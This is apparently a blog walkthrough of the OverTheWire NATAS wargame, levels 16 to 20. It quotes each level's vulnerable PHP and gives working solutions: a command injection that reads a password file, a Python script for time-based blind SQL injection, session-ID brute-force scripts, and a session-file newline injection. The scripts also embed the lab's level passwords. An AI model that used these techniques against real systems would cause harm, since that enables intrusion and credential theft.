---
title: 'OverTheWire: NATAS 16 &#8211; 20'
date: 2019-09-13T15:22:13-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 16

<img class="alignnone size-full wp-image-243" src="/assets/img/2019/09/2019-09-13_14h47_54.png" /> 

This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let&#8217;s see the source:

{% highlight php %}
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
  $key = $_REQUEST["needle"];
}

if($key != "") {
  if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
  } else {
    passthru("grep -i \"$key\" dictionary.txt");
  }
}
?>
{% endhighlight %}

If you put the same query as level 9 `$(cat /etc/natas_webpass/natas17 1>/proc/$$/fd/1)` into the Search field, it doesn&#8217;t work. However, if you put it directly into the address bar after &#8220;index.php?&#8221; it still works! It&#8217;s also pretty obvious this wasn&#8217;t the intended way to solve the challenge, but those are the most fun ways, amirite?

&nbsp;

### LEVEL 17

<img class="alignnone size-full wp-image-251" src="/assets/img/2019/09/2019-09-13_16h16_02.png" /> 

This level is a lot like level 15, however, it gives no output at all, ever! Looking at the source code shows that the output fields are just completely commented out.

The source:

{% highlight php %}
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost', 'natas17', '<censored>');
  mysql_select_db('natas17', $link);
  
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
  if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
  }

  $res = mysql_query($query, $link);
  if($res) {
  if(mysql_num_rows($res) > 0) {
    //echo "This user exists.<br>";
  } else {
    //echo "This user doesn't exist.<br>";
  }
  } else {
    //echo "Error in query.<br>";
  }

  mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
{% endhighlight %}

That means there&#8217;s no straightforward way to extract information about the password. Situations like this is a totally blind SQL injection. Basically, we have to use some kind of side-channel information, like the time it takes to load the page. It can be tested with a SQLi query like `” OR IF(1=1,SLEEP(5),null)#` where you can see how the response takes much longer to arrive.

Rewriting the script from level 15 to measure the website&#8217;s response time as the indicator should work.

{% highlight python %}
#!/usr/bin/python3
#
# main execution script for solving natas17 on OverTheWire.org
# based on https://gist.github.com/Bengman/e14a4b5f1b592ee06961

import requests
import time

# Get start time
start_time = time.time()
# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Characters used
usedChars = ''
# Final Password
password = ''
# Our target URL
target = "http://natas17.natas.labs.overthewire.org"
headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101',
  'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==',
}


def send_query(query):
  payload = {'username': query}
  print("Payload: " + str(payload))
  response = requests.post(target + '/index.php?', data=payload, headers=headers, timeout=1)
  return response


r = requests.get(target, headers=headers)
if r.status_code != requests.codes.ok:
  raise ValueError('Couldn\'t connect to target :(')
else:
  print('Target reachable. Starting character parsing...')

# figure out which chars are needed
print("Getting list of characters used...")
for c in allChars:
  print("Trying Character: " + c)
  try:
    resp = send_query('natas18" and if(password LIKE BINARY "%'+c+'%", sleep(5), null)#')
  except requests.exceptions.Timeout:
    # If we got a timeout, the character exists
    usedChars += c
    print("Character found: " + c)
print("Characters used: " + usedChars)

# retrieve the password one char at a time
for i in range(1, 33):
  print("Testing password...")
  for c in usedChars:
    print("Trying Character: " + c)
    try:
      resp = send_query('natas18" and if(ascii(substring((select password from users where username="natas18"),%d,1))=%s, sleep(3), 1) #' % (i, ord(c)))
    except requests.exceptions.Timeout:
      password += c
      print("Found character: " + c)
      print("Password so far: " + password)
      break

print('Password: ' + password)
print("--- %s seconds ---" % (time.time() - start_time))
{% endhighlight %}

&nbsp;

### LEVEL 18

<img class="alignnone size-full wp-image-255" src="/assets/img/2019/09/2019-09-16_08h17_35.png" /> 

sourcecode:

{% highlight php %}
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { 
  if($_REQUEST["username"] == "admin") {
  /* This method of authentication appears to be unsafe and has been disabled for now. */
    //return 1;
  }

  return 0;
}

function isValidID($id) { 
  return is_numeric($id);
}

function createID($user) { 
  global $maxid;
  return rand(1, $maxid);
}

function debug($msg) { 
  if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg<br>";
  }
}

function my_session_start() { 
  if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
  if(!session_start()) {
    debug("Session start failed");
    return false;
  } else {
    debug("Session start ok");
    if(!array_key_exists("admin", $_SESSION)) {
    debug("Session was old: admin flag set");
    $_SESSION["admin"] = 0; // backwards compatible, secure
    }
    return true;
  }
  }

  return false;
}

function print_credentials() { 
  if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
  print "You are an admin. The credentials for the next level are:<br>";
  print "<pre>Username: natas19\n";
  print "Password: <censored></pre>";
  } else {
  print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
  }
}


$showform = true;
if(my_session_start()) {
  print_credentials();
  $showform = false;
} else {
  if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
  session_id(createID($_REQUEST["username"]));
  session_start();
  $_SESSION["admin"] = isValidAdminLogin();
  debug("New session started");
  $showform = false;
  print_credentials();
  }
} 

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
{% endhighlight %}

This level is apparently designed to give us the password for the next level if we have a flag &#8220;admin&#8221; equal to 1. The code where &#8220;admin&#8221; is updated has been commented out, so we&#8217;re going to have to go about it another way. Notice at the top of the sourcecode is gives us a limit to the session id, 640. That suggests it&#8217;s incremental, and we can hijack an admin session by guessing the session id.

This is the code I used for the bruteforcing.

{% highlight python %}
#!/usr/bin/python3
# Script to brute force level 18 of natas challenges

# Library to work with the POST requests
import requests

# Good message to search for
gstr = "Password"

# Our target URL
target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'

# Check if we can connect to the target
r = requests.get(target)
if r.status_code != requests.codes.ok:
  raise ValueError('Couldn\'t connect to target :(')
else:
  print('Target reachable. Starting character parsing...')

# Send request with incrementing session id in a loop until we get admin
session = 0
while(True):
  session += 1
  print("Attempting Session ID: " + str(session))
  headers = {'Cookie': 'PHPSESSID=' + str(session)}
  r = requests.get(target, headers=headers)
  if gstr in r.text:
    print("Password Found!")
    print(r.text)
    break
{% endhighlight %}

&nbsp;

### LEVEL 19

<img class="alignnone size-full wp-image-256" src="/assets/img/2019/09/2019-09-16_08h37_57.png" /> 

This level doesn&#8217;t supply a link to it&#8217;s sourcecode, so we have to logically deduce what is going on behind the scenes. Much of the functionality should be the same as the previous level, but the text suggests there is a change to the session id.

After attempting the login, then you can see what the session id is. Try a few logins to compare different session id&#8217;s. These are the ones I got:

1) 3539392d61646d696e  
2) 3633312d61646d696e  
3) 3337392d61646d696e

Only the first half of the ID changes. Also, just from experience with binary data, it looks to me like hex encoded ascii. When decoded, they come out to:

1) 599-admin  
2) 631-admin  
3) 379-admin

The pattern is pretty clear, this level just adds &#8220;-admin&#8221; onto the incremental ID. Simply add that to the attack code from before to get the password to the next level.

{% highlight python %}
#!/usr/bin/python3
# Script to brute force level 19 of natas challenges

# Library to work with the POST requests
import requests

# Good message to search for
gstr = "Password"
bstr = "logged in as a regular user"

# Our target URL
target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
  raise ValueError('Couldn\'t connect to target :(')
else:
  print('Target reachable. Starting character parsing...')

# Send request with incrementing session id in a loop until we get admin
num = 0
while(num < 640):
  num += 1
  session = str(num) + "-admin"
  session = session.encode('utf-8')
  print("Attempting Session ID: " + session.hex())
  headers = {'Cookie': 'PHPSESSID=' + session.hex()}
  r = requests.get(target, headers=headers)
  if bstr not in r.text:
    print(r.text)
    break
{% endhighlight %}

&nbsp;

### LEVEL 20

<img class="alignnone size-full wp-image-257" src="/assets/img/2019/09/2019-09-16_08h53_40.png" /> 

sourcecode:

{% highlight php %}
<?

function debug($msg) { 
  if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg<br>";
  }
}

function print_credentials() {
  if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
  print "You are an admin. The credentials for the next level are:<br>";
  print "<pre>Username: natas21\n";
  print "Password: <censored></pre>";
  } else {
  print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
  }
}


/* we don't need this */
function myopen($path, $name) { 
  //debug("MYOPEN $path $name"); 
  return true; 
}

/* we don't need this */
function myclose() { 
  //debug("MYCLOSE"); 
  return true; 
}

function myread($sid) { 
  debug("MYREAD $sid"); 
  if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
  debug("Invalid SID"); 
    return "";
  }
  $filename = session_save_path() . "/" . "mysess_" . $sid;
  if(!file_exists($filename)) {
    debug("Session file doesn't exist");
    return "";
  }
  debug("Reading from ". $filename);
  $data = file_get_contents($filename);
  $_SESSION = array();
  foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
  $parts = explode(" ", $line, 2);
  if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
  }
  return session_encode();
}

function mywrite($sid, $data) { 
  // $data contains the serialized version of $_SESSION
  // but our encoding is better
  debug("MYWRITE $sid $data"); 
  // make sure the sid is alnum only!!
  if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
  debug("Invalid SID"); 
    return;
  }
  $filename = session_save_path() . "/" . "mysess_" . $sid;
  $data = "";
  debug("Saving in ". $filename);
  ksort($_SESSION);
  foreach($_SESSION as $key => $value) {
    debug("$key => $value");
    $data .= "$key $value\n";
  }
  file_put_contents($filename, $data);
  chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
  //debug("MYDESTROY $sid"); 
  return true; 
}
/* we don't need this */
function mygarbage($t) { 
  //debug("MYGARBAGE $t"); 
  return true; 
}

session_set_save_handler(
  "myopen", 
  "myclose", 
  "myread", 
  "mywrite", 
  "mydestroy", 
  "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
  $_SESSION["name"] = $_REQUEST["name"];
  debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
  $name = $_SESSION["name"];
}

?>
{% endhighlight %}

Figuring out this code and what it is doing took me a little while. What is positively super helpful is setting the &#8220;debug&#8221; flag. To do so, just add&#8221;?debug=1&#8243; on the URL. That will help provide a lot of insight.

You&#8217;ll see that whatever you put into the form after &#8220;name&#8221;, the debug returns it as part of your name, and that works even if it&#8217;s on a new line! According to the source we have, when the code reads back data from the session file it does so line by line. So new lines mean new variables to the server side code, and the variable we&#8217;re interested in is &#8220;admin&#8221;. Therefore &#8220;admin&#8221; needs to be set after the name variable. One caveat though, variables set in forms are in the format &#8220;variable=value&#8221;, and that doesn&#8217;t work for the server side &#8220;admin&#8221; variable. That one actually needs to be in the format &#8220;variable value&#8221;.

So the way to get admin is, using Burp, add &#8220;admin 1&#8221; on a new line by itself after the &#8220;name&#8221; variable. Then you&#8217;ll have to load the page twice. Once for the code to write it into the session file on the server. And the second to read it back as an admin status.